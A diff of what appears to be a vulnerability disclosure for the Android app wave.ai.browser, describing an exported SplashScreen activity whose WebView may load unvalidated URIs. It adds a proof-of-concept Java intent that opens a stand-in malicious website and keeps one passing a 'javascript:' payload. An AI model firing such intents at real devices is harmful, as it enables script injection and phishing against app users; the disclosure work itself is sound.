@@ -21,7 +21,10 @@ The `wave.ai.browser.ui.splash.SplashScreen` activity is exported, meaning any t
 
 Suppose this activity uses a WebView component to display web content and doesn't adequately validate or sanitize the URI or any extra data passed in the intent. In that case, a malicious app could craft an intent to execute arbitrary JavaScript within that WebView.
 
-### Code Example:
+### POC:
+
+![wave_ai_uri](https://github.com/actuator/wave.ai.browser/assets/78701239/11744eeb-2c73-4d63-9cea-2986e85c60bb)
+
 
 #### Malicious Intent Creation:
 In a malicious app:
@@ -32,17 +35,15 @@ intent.setData(Uri.parse("javascript:malicious_code_here"));
 startActivity(intent);
 ```
 
-#### Vulnerable WebView Handling (Hypothetical in `wave.ai.browser`):
-```java
-WebView webView = findViewById(R.id.webView);
-webView.getSettings().setJavaScriptEnabled(true);
-Uri data = getIntent().getData();
-if (data != null) {
-    webView.loadUrl(data.toString());
-}
-```
 
-If the `SplashScreen` activity in `wave.ai.browser` loads URIs in this manner without checking or sanitizing them, the malicious JavaScript code would execute within the context of the `wave.ai.browser` app.
+If the `SplashScreen` activity in `wave.ai.browser` loads URIs in this manner without checking or sanitizing them, the malicious JavaScript code would execute within the context of the `wave.ai.browser` app or load an arbitrary website.
+
+```java
+Intent intent = new Intent();
+intent.setComponent(new ComponentName("wave.ai.browser", "wave.ai.browser.ui.splash.SplashScreen"));
+intent.setData(Uri.parse("http://maliciouswebsitetest.com/"));
+startActivity(intent);
+```
 
 ### CWE References:
 
